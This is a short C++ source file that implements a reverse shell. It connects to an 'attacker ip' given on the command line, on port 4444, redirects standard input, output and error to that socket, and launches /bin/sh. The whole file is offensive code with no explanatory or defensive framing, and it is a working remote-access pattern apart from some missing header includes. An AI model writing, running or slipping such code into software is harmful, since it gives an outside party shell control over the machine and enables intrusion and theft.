#include <unistd.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define log_cstyle(X) std::cout << (X) << std::endl;

int main(int argc, char* argv[]) {
    if (argc < 2) {
        log_cstyle("Not enough arguments. Abort.");
        return -1;
    }
    char* attacker_ip = argv[1];
    log_cstyle("Attacker ip: " + std::string(attacker_ip));

    struct sockaddr_in target_address;
    target_address.sin_family = AF_INET;
    target_address.sin_port = htons(4444);
    inet_aton(attacker_ip, &target_address.sin_addr);

    int socket_file_descriptor = socket(AF_INET, SOCK_STREAM, 0);
    connect(socket_file_descriptor, (struct sockaddr*)&target_address, sizeof(target_address));

    for (int index = 0; index < 3; ++index) {
        dup2(socket_file_descriptor, index);
    }

    execve("/bin/sh", NULL, NULL);
    return 0;
}